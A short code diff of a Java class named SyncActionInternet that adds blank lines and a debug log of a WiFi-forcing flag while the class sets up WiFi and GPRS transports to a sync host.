@@ -74,6 +74,7 @@ public class SyncActionInternet extends SyncAction {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " Error: params FAILED"); //$NON-NLS-1$
 			}
+			
 			return false;
 		}
 
@@ -85,6 +86,7 @@ public class SyncActionInternet extends SyncAction {
 			sb.append(" host: " + host); //$NON-NLS-1$
 			Check.log(TAG + sb.toString()) ;//$NON-NLS-1$
 		}
+		
 		return true;
 	}
 
@@ -101,6 +103,11 @@ public class SyncActionInternet extends SyncAction {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " initTransport adding WifiTransport"); //$NON-NLS-1$
 			}
+			
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (initTransport): wifiForced: " + wifiForced); //$NON-NLS-1$
+			}
+			
 			transports.addElement(new WifiTransport(host, wifiForced));
 		}
 
@@ -108,6 +115,7 @@ public class SyncActionInternet extends SyncAction {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " initTransport adding DirectTransport"); //$NON-NLS-1$
 			}
+			
 			transports.addElement(new GprsTransport(host));
 		}
 
